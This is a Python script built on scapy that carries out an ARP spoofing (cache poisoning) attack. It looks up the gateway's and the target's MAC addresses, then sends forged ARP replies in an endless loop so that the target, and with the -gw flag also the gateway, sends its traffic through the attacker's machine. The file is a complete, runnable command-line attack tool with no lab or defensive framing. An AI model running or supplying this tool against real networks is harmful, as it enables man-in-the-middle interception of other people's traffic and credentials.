from scapy.all import *
import sys
import argparse
import threading

from scapy.layers.inet import IP
from scapy.layers.l2 import Ether, ARP


def main(i_face, victim_ip, src, delay=1, gw=False):
    """
    gets the arguments for the ARP spoofing attack

    :param i_face: The interface you want to use
    :param victim_ip: The ip of the target
    :param src: IP you want to use?
    :param delay: The delay between each is_at message
    :param gw: Should the gateway be attacked?

    :return:
    """
    # Gets the mac address of the attacker
    real_mac = get_if_hwaddr(i_face)
    # Gets the ip of the gateway
    gw_ip = src
    # Gets the mac address of the gateway
    gw_mac = mac2str(sr(ARP(op=1, hwsrc=mac2str(real_mac), pdst=gw_ip))[0][0][1].hwsrc)
    # Gets the mac address of the target
    victim_mac = mac2str(sr(ARP(op=1, hwsrc=mac2str(real_mac), pdst=victim_ip))[0][0][1].hwsrc)
    # First thread - claims the gateways ip as the attackers ip:
    spoof_target = threading.Thread(target=spoof, args=(real_mac, victim_ip, gw_ip, victim_mac, i_face, delay,))
    spoof_target.start()
    # If gw flag is on
    if gw:
        # Second thread - claims the targets ip as the attackers ip:
        spoof_gw = threading.Thread(target=spoof, args=(real_mac, gw_ip, victim_ip, gw_mac, i_face, delay,))
        spoof_gw.start()


def spoof(real_mac, src_ip, dst_ip, src_mac, i_face=conf.iface, delay=1):
    """
    sends the is_at messages, the actual attack

    :param real_mac: The mac address of the attacker
    :param src_ip: The IP of the source of the "who_is" message (the attacked ip - the target)
    :param dst_ip: The IP of the destination of the "who_is" message (the faked ip - the gateway(?))
    :param src_mac: The mac address of the target (the source of the "who_is" message)
    :param i_face: The interface you wish to use
    :param delay: The delay between each is_at message

    :return:
    """
    while True:
        reply = ARP(op=2, hwsrc=mac2str(real_mac), psrc=dst_ip, hwdst=src_mac, pdst=src_ip)
        # Sends the is at message to the src_mac ()
        send(reply, iface=i_face)
        time.sleep(delay)


def get_args():
    parser = argparse.ArgumentParser(description='Spoof ARP tables')

    parser.add_argument('-i', '--iface', metavar='IFACE', default=conf.iface, type=str,
                        help='Interface you wish to use')
    parser.add_argument('-s', '--src', metavar='SRC', type=str, default=conf.route.route("0.0.0.0")[2],
                        help='The address you want for the attacker')
    parser.add_argument('-d', '--delay', metavar='DELAY', type=int, default=2,
                        help='Delay (in seconds) between messages')
    parser.add_argument('-gw', default=False, action='store_true',
                        help='should GW be attacked as well')
    required = parser.add_argument_group('required arguments')
    required.add_argument('-t', '--target', metavar='TARGET', type=str,
                          help='IP of target', required=True)
    args = parser.parse_args()

    main(i_face=args.iface, src=args.src, delay=args.delay, gw=args.gw, victim_ip=args.target)


if __name__ == '__main__':
    get_args()
